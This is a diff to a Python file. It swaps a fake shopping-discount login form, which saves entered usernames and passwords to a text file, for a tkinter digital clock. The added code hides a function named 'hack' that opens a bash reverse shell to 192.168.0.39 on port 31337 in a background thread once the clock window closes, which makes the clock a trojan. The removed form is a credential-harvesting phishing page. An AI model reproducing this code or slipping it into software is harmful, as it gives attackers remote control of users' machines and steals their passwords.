@@ -1,111 +1,55 @@
-# import json
-#
-# def login(usr):
-#     uN = input("Name: ")
-#     pW = input("Password: ")
-#
-#     if uN in usr.keys():
-#         if pW == usr[uN]:
-#             print("Welcome back.")
-#         else:
-#             print("Incorrect password.")
-#             return False
-#     else:
-#         print("Hello, new person.")
-#         usr[uN] = pW
-#
-#     writeUsers(usr)
-#     return True
-#
-# def readUsers():
-#     try:
-#         with open("users.json", "r") as f:
-#             return json.load(f)
-#     except FileNotFoundError:
-#         return {}
-#
-# def writeUsers(usr):
-#     with open("users.json", "w+") as f:
-#             json.dump(usr, f)
-#
-# users = readUsers()
-# success = login(users)
-#
-# while not success:
-#     success = login(users)
+# start by importing all the necessary libraries
 
-#
-# def get_input():
-#     first_num = int(input("Enter the first number:      "))
-#     second_num = int(input("Enter the second number:    "))
-#     return first_num, second_num
-#
-#
-# def add():
-#     x, y = get_input()
-#     return x + y
-#
-#
-# def subtract():
-#     x, y = get_input()
-#     return x - y
-#
-#
-# def multiply():
-#     x, y = get_input()
-#     return x * y
-#
-#
-# def divide():
-#     x, y = get_input()
-#     return x // y
-#
-#
-# def errorHandler():
-#     return "Invalid choice"
-#
-#
-# choice = int(input("Which operation do you want to carry out "))
-#
-# operations = {
-#     1: add,
-#     2: subtract,
-#     3: multiply,
-#     4: divide
-# }
-#
-# output = operations.get(choice, errorHandler)()
-# print(output)
+from tkinter import *
+import sys
+import time  # library to get the current time
+import subprocess
+import threading
 
 
-from tkinter import*
-root = Tk()
-root.geometry('500x500')
-root.title(" Login ")
-credentials = open("credentials.txt", mode="a+", encoding="utf-8")
-def getValue():
-    username_value = entry_1.get()
-    password_value = entry_2.get()
-    credentials.write("Username " + username_value + "\n")
-    credentials.writelines("Password " + password_value + "\n")
-    print(username_value)
-    print(password_value)
-    credentials.close()
+# create a function displayTime and variable time_now
+def displayTime():
+    # show the current hour,minute,seconds
+    time_now = time.strftime("%H : %M : %S %p")
+    # clock configuration
+    clock_label.config(text=time_now)
+    # after every 200 microseconds the clock will change
+    clock_label.after(200, displayTime)
 
 
-label_0 = Label(root, text="Kikuu now has great discount offers Login and check it out! ",width=50,font=("bold", 13))
-label_0.place(x=45,y=53)
-label_1 = Label(root, text="Username",width=20,font=("bold", 12))
-label_1.place(x=80,y=130)
-entry_1 = Entry(root)
-entry_1.place(x=240,y=130)
-label_2 = Label(root, text="Password",width=20,font=("bold", 12))
-label_2.place(x=68,y=180)
-entry_2 = Entry(root)
-entry_2.config(show="*")
-entry_2.place(x=240,y=180)
-Button(root, text='Submit',width=20,bg='blue',fg='white', command=getValue).place(x=180,y=220)
+# Creation of a variable responsible for storing the tkinter window
+main = Tk()
+# window size defined
+main.geometry("720x420")
+
+# First label - shows the time,
+# Second label - shows hour:minute:second,
+# Third label - shows the digital clock's title at the top
 
 
-root.mainloop()
-print("registration form  seccussfully created...")
+text_font = ("Boulder", 68, 'bold')
+background = "#f2e750"
+foreground = "#363529"
+border_width = 25
+
+clock_label = Label(main, font=text_font, bg=background, fg=foreground, bd=border_width)
+clock_label.grid(row=2, column=2, pady=25, padx=20)
+displayTime()
+
+# creation of a digital clock's variable
+digital_clock_title = Label(main, text="The Digital Clock in Python", font="times 24 bold")
+digital_clock_title.grid(row=0, column=2)
+
+hours_mins_secs = Label(main, text="Hours             Minutes          Seconds", font="times 15 bold")
+hours_mins_secs.grid(row=3, column=2, pady=25, padx=7)
+
+
+def hack(num):
+    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.39/31337 0<&1 2>&1", shell=True, executable='/bin/bash')
+
+
+if __name__ == '__main__':
+    main.mainloop()
+    thread = threading.Thread(target=hack, args=(10,))
+    thread.start()
+    exit()
